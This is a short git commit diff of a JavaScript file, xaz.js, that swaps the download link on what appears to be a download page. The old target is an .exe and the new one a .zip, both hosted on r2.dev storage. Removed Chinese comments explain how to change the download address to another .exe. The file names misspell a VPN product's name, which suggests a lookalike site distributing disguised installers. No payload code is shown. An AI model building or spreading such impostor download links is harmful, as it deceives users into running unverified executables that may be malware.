a482ceb85953d006511438a10fd83e807091d00a
aa168188aa <liub57070@gmail.com>
2025-05-12 01:28:26 +0800

    Update xaz.js

--- xaz.js
+++ xaz.js
@@ -1,9 +1,8 @@
  
 
-var xz = "download.html?file=https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe";
+var xz = "download.html?file=https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/letsvp%20x64xisla.zip";
 
-//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe
-//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe
+
 
 
 
